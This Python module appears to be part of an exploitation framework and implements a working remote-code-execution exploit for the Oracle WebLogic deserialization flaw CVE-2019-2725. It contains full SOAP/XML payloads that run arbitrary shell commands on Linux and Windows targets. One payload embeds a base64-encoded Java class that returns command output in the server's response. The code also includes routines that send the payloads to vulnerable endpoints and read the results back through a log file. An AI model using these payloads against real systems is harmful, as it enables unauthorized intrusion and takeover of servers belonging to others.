#!/usr/bin/env python3

import asyncio
from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class CVE_2019_2725_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2019-2725',
            'description': 'Weblogic Deserialize Vulnerability, Weblogic 10.3.6.0.0 and 12.1.3.0.0',
            'date': '2019-04-26',
            'type': 'Deserialize',
            'exptype': 'check,cmd,read,reverse,webshell'
        }
        self.url = url
        self.osname = 'Unknown'
        self.capta = get_capta()
        self.headers = {
            'User-Agent': get_useragent(),
            'Content-Type': 'text/xml;charset=UTF-8',
        }
        
        self.linux_payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
            xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">  
            <soapenv:Header> 
                <wsa:Action>log</wsa:Action>
                <wsa:RelatesTo>log</wsa:RelatesTo>
                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.4.0" class="java.beans.XMLDecoder"> 
                    <void class="java.lang.ProcessBuilder"> 
                    <array class="java.lang.String" length="3"> 
                        <void index="0"> 
                        <string>/bin/bash</string> 
                        </void>  
                        <void index="1"> 
                        <string>-c</string> 
                        </void>  
                        <void index="2"> 
                        <string>{cmd}</string>
                        </void> 
                    </array>  
                    <void method="start"/>
                    </void> 
                </java>    </work:WorkContext>
            </soapenv:Header>
            <soapenv:Body>
                <asy:onAsyncDelivery/>
            </soapenv:Body>
            </soapenv:Envelope>       
        '''
        self.windows_payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
            xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">  
            <soapenv:Header> 
                <wsa:Action>log</wsa:Action>
                <wsa:RelatesTo>log</wsa:RelatesTo>
                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.4.0" class="java.beans.XMLDecoder"> 
                    <void class="java.lang.ProcessBuilder"> 
                    <array class="java.lang.String" length="3"> 
                        <void index="0"> 
                        <string>cmd.exe</string> 
                        </void>  
                        <void index="1"> 
                        <string>/c</string> 
                        </void>  
                        <void index="2"> 
                        <string>{cmd}</string> 
                        </void> 
                    </array>  
                    <void method="start"/>
                    </void> 
                </java>    </work:WorkContext>
            </soapenv:Header>
            <soapenv:Body>
                <asy:onAsyncDelivery/>
            </soapenv:Body>
            </soapenv:Envelope>       
        '''
    
    async def weblogic_10_3_6(self, cmd):
        
        '''
        执行weblogic 10.3.6的payload

        :param str: cmd: 要执行的命令
        
        :return str result or False
        '''
        
        try:
            linux_req = await request.post(self.url + '/_async/AsyncResponseService', headers = self.headers, data = self.linux_payload.format(cmd = cmd))
            windows_req = await request.post(self.url + '/_async/AsyncResponseService', headers = self.headers, data = self.windows_payload.format(cmd = cmd))
            await asyncio.sleep(2)
            check_req = await request.get(self.url + '/_async/access.log', headers = self.headers)
            if linux_req.status == 202 and check_req.status == 200:
                return True, await check_req.text()
            if windows_req.status == 202 and check_req.status == 200:
                return True, await check_req.text()
        except Exception as e:
            # print(e)
            pass

    async def weblogic_12_1_3(self, cmd):
        
        '''
        执行weblogic 12.1.3的payload,此payload并不支持所有的命令,使用cat /etc/passwd命令就会失败,使用ls -la就可以

        :param str: cmd: 要执行的命令
        
        :return str result or False
        '''
        
        payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"> <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
            <java>
            <class><string>org.slf4j.ext.EventData</string>
            <void>
            <string>
                    <java>
                        <void class="sun.misc.BASE64Decoder">
                            <void method="decodeBuffer" id="byte_arr">	<string>yv66vgAAADIAYwoAFAA8CgA9AD4KAD0APwoAQABBBwBCCgAFAEMHAEQKAAcARQgARgoABwBHBwBICgALADwKAAsASQoACwBKCABLCgATAEwHAE0IAE4HAE8HAFABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEExSZXN1bHRCYXNlRXhlYzsBAAhleGVjX2NtZAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQABcAEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAANmaXMBABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAAZyZXN1bHQBAA1TdGFja01hcFRhYmxlBwBRBwBSBwBTBwBCBwBEAQAKRXhjZXB0aW9ucwEAB2RvX2V4ZWMBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247BwBNBwBUAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAChSZXN1bHRCYXNlRXhlYy5qYXZhIGZyb20gSW5wdXRGaWxlT2JqZWN0DAAVABYHAFUMAFYAVwwAWABZBwBSDABaAFsBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAVAFwBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyDAAVAF0BAAAMAF4AXwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABgAGEMAGIAXwEAC2NtZC5leGUgL2MgDAAcAB0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQALL2Jpbi9zaCAtYyABAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABMAFAAAAAAABAABABUAFgABABcAAAAvAAEAAQAAAAUqtwABsQAAAAIAGAAAAAYAAQAAAAMAGQAAAAwAAQAAAAUAGgAbAAAACQAcAB0AAgAXAAAA+QADAAcAAABOuAACKrYAA0wrtgAETbsABVkstwAGTrsAB1kttwAIOgQBOgUSCToGGQS2AApZOgXGABy7AAtZtwAMGQa2AA0ZBbYADbYADjoGp//fGQawAAAAAwAYAAAAJgAJAAAABgAIAAcADQAIABYACQAgAAoAIwALACcADAAyAA4ASwARABkAAABIAAcAAABOAB4AHwAAAAgARgAgACEAAQANAEEAIgAjAAIAFgA4ACQAJQADACAALgAmACcABAAjACsAKAAfAAUAJwAnACkAHwAGACoAAAAfAAL/ACcABwcAKwcALAcALQcALgcALwcAKwcAKwAAIwAwAAAABAABABEACQAxAB0AAgAXAAAAqgACAAMAAAA3EglMuwALWbcADBIPtgANKrYADbYADrgAEEynABtNuwALWbcADBIStgANKrYADbYADrgAEEwrsAABAAMAGgAdABEAAwAYAAAAGgAGAAAAFgADABkAGgAeAB0AGwAeAB0ANQAfABkAAAAgAAMAHgAXADIAMwACAAAANwAeAB8AAAADADQAKQAfAAEAKgAAABMAAv8AHQACBwArBwArAAEHADQXADAAAAAEAAEANQAJADYANwACABcAAAArAAAAAQAAAAGxAAAAAgAYAAAABgABAAAANgAZAAAADAABAAAAAQA4ADkAAAAwAAAABAABADUAAQA6AAAAAgA7</string>
                            </void>
                        </void>
                        <void class="org.mozilla.classfile.DefiningClassLoader">
                            <void method="defineClass">
                                <string>ResultBaseExec</string>
                                <object idref="byte_arr"></object>
                                <void method="newInstance">
                                    <void method="do_exec" id="result">
                                        <string>%s</string>
                                    </void>
                                </void>
                            </void>
                        </void>
                        <void class="java.lang.Thread" method="currentThread">
                            <void method="getCurrentWork" id="current_work">
                                <void method="getClass">
                                    <void method="getDeclaredField">
                                        <string>connectionHandler</string>
                                            <void method="setAccessible"><boolean>true</boolean></void>
                                        <void method="get">
                                            <object idref="current_work"></object>
                                            <void method="getServletRequest">
                                                <void method="getResponse">
                                                    <void method="getServletOutputStream">
                                                        <void method="writeStream">
                                                            <object class="weblogic.xml.util.StringInputStream"><object idref="result"></object></object>
                                                            </void>
                                                        <void method="flush"/>
                                                        </void>
                                                <void method="getWriter"><void method="write"><string></string></void></void>
                                                </void>
                                            </void>
                                        </void>
                                    </void>
                                </void>
                            </void>
                        </void>
                    </java>
            </string>
            </void>
            </class>
            </java>
            </work:WorkContext>
            </soapenv:Header>
            <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
        '''%(cmd)
        try:
            req = await request.post(self.url + '/wls-wsat/CoordinatorPortType', headers = self.headers, data = payload)
            if req.status == 200:
                return True, await req.text()
        except Exception as e:
            # print(e)
            pass

    async def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return tuple True,payload or False
        """
        
        check_payload =  'echo %swin^dowslin$1ux' %(self.capta)
        weblogic_10_3_6_check = await self.weblogic_10_3_6(check_payload + ' > ./servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/access.log')
        if weblogic_10_3_6_check:
            if 'linux' in weblogic_10_3_6_check[1] and self.capta in weblogic_10_3_6_check[1]:
                self.osname = 'Linux'
                return True, 'weblogic_10_3_6', 'Linux'
            if 'windows' in weblogic_10_3_6_check[1] and self.capta in weblogic_10_3_6_check[1]:
                self.osname = 'Windows'
                return True, 'weblogic_10_3_6', 'Windows'
        weblogic_12_1_3_check = await self.weblogic_12_1_3('echo %swin^dowslin$1ux' %(self.capta))
        if weblogic_12_1_3_check:
            if self.capta in weblogic_12_1_3_check[1] and ('windows' in weblogic_12_1_3_check[1] or 'linux' in weblogic_12_1_3_check[1]):
                if 'linux' in weblogic_12_1_3_check[1]:
                    self.osname = 'linux'
                    return True, 'weblogic_12_1_3', 'Linux'
                elif 'windows' in weblogic_12_1_3_check[1]:
                    self.osname = 'windows'
                    return True, 'weblogic_12_1_3', 'Windows'

if __name__ == '__main__':
    CVE_2019_2725 = CVE_2019_2725_BaseVerify('http://127.0.0.1:7001')

